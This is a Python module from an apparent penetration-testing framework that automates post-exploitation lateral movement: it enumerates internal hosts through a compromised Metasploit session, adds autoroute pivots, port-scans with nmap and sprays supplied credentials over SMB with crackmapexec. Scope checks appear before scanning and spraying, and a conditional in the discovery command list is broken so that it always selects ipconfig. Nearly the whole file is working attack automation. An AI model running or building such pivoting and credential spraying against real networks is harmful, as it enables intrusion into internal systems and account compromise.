"""
tools_integration/auto_pivot.py - Automatic lateral movement

Uses Metasploit session + tools on Kali to discover & pivot.
"""

import re
from typing import Dict, List
from rich.console import Console
from rich.panel import Panel

from core.tools_engine import RemoteToolExecutor
from core.scope_guard import validate_scope

console = Console()


class AutoPivot:
    """Autonomous lateral movement via compromised sessions."""

    def __init__(self, kali=None):
        self.kali = kali
        self.pivots = []

    # ─── Discovery ────────────────────────────────────────

    def discover_network(self, session_id: str, session_type: str = "meterpreter") -> List[str]:
        """Find internal hosts from a compromised session."""
        from tools_integration.metasploit_rpc import MetasploitRPC
        msf = MetasploitRPC()
        if not msf.is_ready():
            return []

        console.print(f"[cyan][*] Discovering network from session {session_id}[/cyan]")

        commands = {
            "meterpreter": [
                "ipconfig" if "windows" else "ifconfig -a",
                "netstat -rn",
                "arp -a",
            ],
            "shell": [
                "ip a || ifconfig",
                "netstat -rn || route -n",
                "cat /etc/hosts",
            ],
        }

        hosts = set()
        for cmd in commands.get(session_type, commands["shell"]):
            output = msf.session_command(session_id, cmd)
            for ip in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", output):
                if not ip.startswith(("127.", "0.", "255.")):
                    hosts.add(ip)

        console.print(f"[green][+] Found {len(hosts)} potential hosts[/green]")
        return list(hosts)

    # ─── Pivot Route ──────────────────────────────────────

    def add_pivot_route(self, session_id: str, subnet: str) -> bool:
        """Add autoroute through session."""
        from tools_integration.metasploit_rpc import MetasploitRPC
        msf = MetasploitRPC()
        if not msf.is_ready():
            return False

        try:
            msf.session_command(session_id, f"run autoroute -s {subnet}")
            console.print(f"[green][+] Pivot route added: {subnet} via {session_id}[/green]")
            self.pivots.append({
                "session": session_id,
                "subnet": subnet,
            })
            return True
        except Exception as e:
            console.print(f"[red]Pivot add failed: {e}[/red]")
            return False

    # ─── Auto Lateral Movement ────────────────────────────

    def auto_lateral_movement(
        self,
        session_id: str,
        credentials: List[Dict] = None,
    ) -> Dict:
        """
        Discover network, scan ports, try credentials.

        NOTE: Every internal host MUST pass scope check before scanning.
        """
        console.print(Panel(
            "[bold red]AUTO LATERAL MOVEMENT[/bold red]",
            border_style="red",
        ))

        result = {
            "starting_session": session_id,
            "hosts_found": [],
            "accessible": [],
            "new_sessions": [],
            "credentials_used": credentials or [],
        }

        # ─── Step 1: Discovery ────────────────────────────
        hosts = self.discover_network(session_id)
        result["hosts_found"] = hosts

        # ─── Step 2: Scope-filtered port scan ─────────────
        accessible = []
        for host in hosts[:20]:
            allowed, reason = validate_scope(host)
            if not allowed:
                console.print(f"[dim]Skip {host}: {reason}[/dim]")
                continue

            scan = RemoteToolExecutor.execute(
                "nmap",
                ["-Pn", "-p", "22,80,135,139,445,3389,5985", "--open", host],
                host,
                timeout=120,
            )
            if "open" in scan.get("output", "").lower():
                accessible.append(host)
                console.print(f"[green][+] Reachable: {host}[/green]")

        result["accessible"] = accessible

        # ─── Step 3: Credential spray (scope-checked) ─────
        if credentials:
            for cred in credentials:
                for host in accessible:
                    # Double check
                    if not validate_scope(host)[0]:
                        continue

                    cme_cmd = [
                        "crackmapexec", "smb", host,
                        "-u", cred.get("user", ""),
                        "-p", cred.get("pass", ""),
                    ]
                    out = RemoteToolExecutor.execute(
                        "crackmapexec", cme_cmd[1:], host,
                    )
                    if "Pwn3d!" in out.get("output", ""):
                        console.print(f"[bold green][+] LATERAL: {host}[/bold green]")
                        result["new_sessions"].append({
                            "host": host,
                            "credential": cred,
                            "success": True,
                        })

        return result

    def get_pivot_map(self) -> List[Dict]:
        return self.pivots